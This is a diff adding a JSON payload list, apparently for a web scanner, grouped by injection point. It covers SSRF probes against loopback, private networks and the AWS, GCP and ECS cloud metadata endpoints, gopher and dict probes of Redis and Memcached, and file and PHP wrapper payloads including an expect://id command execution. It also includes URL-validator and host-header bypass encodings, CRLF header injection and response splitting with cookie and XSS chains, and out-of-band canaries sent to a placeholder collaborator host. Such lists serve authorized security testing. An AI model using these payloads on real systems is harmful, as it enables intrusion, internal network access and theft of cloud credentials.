@@ -1,0 +1,351 @@
+{
+  "fetch_url": [
+    {
+      "category": "internal_loopback",
+      "payload": "http://127.0.0.1/",
+      "intent": "loopback fetch"
+    },
+    {
+      "category": "internal_loopback",
+      "payload": "http://localhost/",
+      "intent": "loopback fetch (hostname)"
+    },
+    {
+      "category": "cloud_metadata",
+      "payload": "http://169.254.169.254/latest/meta-data/",
+      "intent": "AWS IMDS probe"
+    },
+    {
+      "category": "cloud_metadata",
+      "payload": "http://metadata.google.internal/computeMetadata/v1/",
+      "intent": "GCP metadata probe"
+    },
+    {
+      "category": "internal_rfc1918",
+      "payload": "http://10.0.0.1/",
+      "intent": "RFC1918 10.x probe"
+    },
+    {
+      "category": "internal_rfc1918",
+      "payload": "http://192.168.0.1/",
+      "intent": "RFC1918 192.168.x probe"
+    },
+    {
+      "category": "protocol_gopher",
+      "payload": "gopher://127.0.0.1:6379/_INFO%0d%0a",
+      "intent": "gopher Redis INFO probe"
+    },
+    {
+      "category": "protocol_dict",
+      "payload": "dict://127.0.0.1:11211/stats",
+      "intent": "dict Memcached stats probe"
+    },
+    {
+      "category": "scheme_file",
+      "payload": "file:///etc/hostname",
+      "intent": "local file read probe"
+    },
+    {
+      "category": "oob_canary",
+      "payload": "http://{token}.{collab_host}/",
+      "intent": "blind SSRF OOB canary"
+    },
+    {
+      "category": "scheme_dict",
+      "payload": "dict://127.0.0.1:6379/INFO",
+      "note": "Dict protocol \u2192 Redis"
+    },
+    {
+      "category": "scheme_dict",
+      "payload": "dict://127.0.0.1:11211/stats",
+      "note": "Dict protocol \u2192 Memcached"
+    },
+    {
+      "category": "scheme_ftp",
+      "payload": "ftp://127.0.0.1:21/",
+      "note": "FTP scheme \u2014 often unblocked"
+    },
+    {
+      "category": "scheme_ldap",
+      "payload": "ldap://127.0.0.1:389/",
+      "note": "LDAP scheme confusion"
+    },
+    {
+      "category": "scheme_tftp",
+      "payload": "tftp://127.0.0.1:69/BLKSIZE",
+      "note": "TFTP scheme confusion"
+    },
+    {
+      "category": "scheme_sftp",
+      "payload": "sftp://127.0.0.1:22/",
+      "note": "SFTP scheme \u2014 bypasses HTTP-only checks"
+    },
+    {
+      "category": "scheme_jar",
+      "payload": "jar:http://127.0.0.1:80/!/",
+      "note": "JAR URL \u2014 Java-specific bypass"
+    },
+    {
+      "category": "scheme_netdoc",
+      "payload": "netdoc:http://127.0.0.1/",
+      "note": "Netdoc scheme \u2014 Java-specific bypass"
+    },
+    {
+      "category": "oob_generic",
+      "payload": "http://{token}.{collab_host}/",
+      "note": "Generic OOB HTTP canary"
+    },
+    {
+      "category": "oob_canary",
+      "payload": "http://{token}.{collab_host}/ssrf-v5",
+      "note": "OOB canary with path marker"
+    },
+    {
+      "category": "oob_dns",
+      "payload": "http://{token}.{collab_host}",
+      "note": "OOB DNS-only canary (no path)"
+    }
+  ],
+  "redirect": [
+    {
+      "category": "open_redirect_internal",
+      "payload": "http://127.0.0.1/",
+      "intent": "redirect to loopback"
+    },
+    {
+      "category": "open_redirect_internal",
+      "payload": "//127.0.0.1/",
+      "intent": "schema-relative redirect to loopback"
+    },
+    {
+      "category": "open_redirect_metadata",
+      "payload": "http://169.254.169.254/latest/meta-data/",
+      "intent": "redirect chained to metadata"
+    },
+    {
+      "category": "oob_canary",
+      "payload": "http://{token}.{collab_host}/",
+      "intent": "redirect-based OOB canary"
+    },
+    {
+      "category": "second_order",
+      "payload": "http://10.0.0.1/",
+      "intent": "second-order internal redirect"
+    },
+    {
+      "category": "redirect_crlf",
+      "payload": "http://127.0.0.1%0d%0aX-Injected:%20v5",
+      "note": "CRLF in redirect value"
+    },
+    {
+      "category": "redirect_meta",
+      "payload": "http://169.254.169.254/",
+      "note": "Redirect to IMDS"
+    },
+    {
+      "category": "oob_canary",
+      "payload": "http://{token}.{collab_host}/redirect",
+      "note": "OOB via redirect"
+    }
+  ],
+  "file_include": [
+    {
+      "category": "file_read_probe",
+      "payload": "file:///etc/hostname",
+      "intent": "non-sensitive file read proof"
+    },
+    {
+      "category": "file_read_probe",
+      "payload": "file:///etc/os-release",
+      "intent": "non-sensitive file read proof"
+    },
+    {
+      "category": "wrapper_php",
+      "payload": "php://filter/convert.base64-encode/resource=index",
+      "intent": "PHP wrapper probe (if PHP backend)"
+    },
+    {
+      "category": "internal_fetch",
+      "payload": "http://127.0.0.1/",
+      "intent": "treat include path as URL fetch"
+    },
+    {
+      "category": "php_filter",
+      "payload": "php://filter/convert.base64-encode/resource=/etc/hostname",
+      "note": "PHP filter wrapper"
+    },
+    {
+      "category": "php_input",
+      "payload": "php://input",
+      "note": "PHP input stream"
+    },
+    {
+      "category": "data_uri",
+      "payload": "data://text/plain;base64,aGVsbG9oZWxsb2hlbGxv",
+      "note": "Data URI scheme"
+    },
+    {
+      "category": "expect",
+      "payload": "expect://id",
+      "note": "PHP expect wrapper (RCE if loaded)"
+    },
+    {
+      "category": "phar",
+      "payload": "phar:///tmp/hellhound.phar/",
+      "note": "Phar deserialization wrapper"
+    }
+  ],
+  "validator": [
+    {
+      "category": "scheme_confusion",
+      "payload": "http://127.0.0.1@expected-host/",
+      "intent": "userinfo confusion bypass"
+    },
+    {
+      "category": "scheme_confusion",
+      "payload": "http://expected-host%2523@127.0.0.1/",
+      "intent": "encoded fragment confusion"
+    },
+    {
+      "category": "ip_obfuscation",
+      "payload": "http://2130706433/",
+      "intent": "decimal IP for 127.0.0.1"
+    },
+    {
+      "category": "ip_obfuscation",
+      "payload": "http://0x7f000001/",
+      "intent": "hex IP for 127.0.0.1"
+    },
+    {
+      "category": "redirect_bypass",
+      "payload": "https://allowed-host.example/redirect?to=http://127.0.0.1/",
+      "intent": "allow-listed host that redirects internally (placeholder, customize per target)"
+    }
+  ],
+  "unknown": [
+    {
+      "category": "generic_loopback",
+      "payload": "http://127.0.0.1/",
+      "intent": "baseline loopback test"
+    },
+    {
+      "category": "generic_metadata",
+      "payload": "http://169.254.169.254/latest/meta-data/",
+      "intent": "baseline metadata test"
+    },
+    {
+      "category": "generic_oob",
+      "payload": "http://{token}.{collab_host}/",
+      "intent": "baseline OOB canary"
+    }
+  ],
+  "crlf_injection": [
+    {
+      "category": "crlf_basic",
+      "payload": "%0d%0aX-Injected:%20hellhound-v5",
+      "note": "CRLF URL-encoded, header injection"
+    },
+    {
+      "category": "crlf_basic",
+      "payload": "%0aX-Injected:%20hellhound-v5",
+      "note": "LF only \u2014 some servers split on LF alone"
+    },
+    {
+      "category": "crlf_basic",
+      "payload": "\r\nX-Injected: hellhound-v5",
+      "note": "Raw CRLF \u2014 test unencoded path"
+    },
+    {
+      "category": "crlf_double",
+      "payload": "%0d%0a%0d%0aX-Injected:%20hellhound-v5",
+      "note": "Double CRLF \u2014 HTTP response splitting"
+    },
+    {
+      "category": "crlf_utf8",
+      "payload": "%E5%98%8A%E5%98%8DX-Injected:%20hellhound-v5",
+      "note": "UTF-8 CRLF sequence (Jetty bypass)"
+    },
+    {
+      "category": "crlf_unicode",
+      "payload": "%u000d%u000aX-Injected:%20hellhound-v5",
+      "note": "Unicode CRLF \u2014 IIS bypass"
+    },
+    {
+      "category": "crlf_location",
+      "payload": "%0d%0aLocation:%20http://169.254.169.254/latest/meta-data/",
+      "note": "CRLF + redirect to IMDS"
+    },
+    {
+      "category": "crlf_setcookie",
+      "payload": "%0d%0aSet-Cookie:%20session=hellhound-v5;Path=/",
+      "note": "CRLF + cookie injection"
+    },
+    {
+      "category": "crlf_html",
+      "payload": "%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>",
+      "note": "CRLF + content-type \u2192 reflected XSS via SSRF chain"
+    }
+  ],
+  "host_header": [
+    {
+      "category": "oob_canary",
+      "payload": "{token}.{collab_host}",
+      "note": "OOB host header SSRF canary"
+    },
+    {
+      "category": "host_loopback",
+      "payload": "127.0.0.1",
+      "note": "Loopback \u2014 test routing bypass"
+    },
+    {
+      "category": "host_loopback",
+      "payload": "localhost",
+      "note": "Localhost alias"
+    },
+    {
+      "category": "host_metadata",
+      "payload": "169.254.169.254",
+      "note": "AWS/DO IMDS via Host header"
+    },
+    {
+      "category": "host_metadata",
+      "payload": "metadata.google.internal",
+      "note": "GCP metadata endpoint"
+    },
+    {
+      "category": "host_metadata",
+      "payload": "169.254.170.2",
+      "note": "ECS task metadata"
+    },
+    {
+      "category": "host_ipv6",
+      "payload": "[::1]",
+      "note": "IPv6 loopback"
+    },
+    {
+      "category": "host_ipv6",
+      "payload": "[::ffff:127.0.0.1]",
+      "note": "IPv4-mapped IPv6 loopback"
+    },
+    {
+      "category": "host_encoded",
+      "payload": "0x7f000001",
+      "note": "Hex loopback \u2014 some parsers resolve"
+    },
+    {
+      "category": "host_encoded",
+      "payload": "2130706433",
+      "note": "Decimal loopback"
+    },
+    {
+      "category": "host_private",
+      "payload": "192.168.1.1",
+      "note": "Internal gateway probe"
+    },
+    {
+      "category": "host_private",
+      "payload": "10.0.0.1",
+      "note": "Internal network probe"
+    }
+  ]
+}
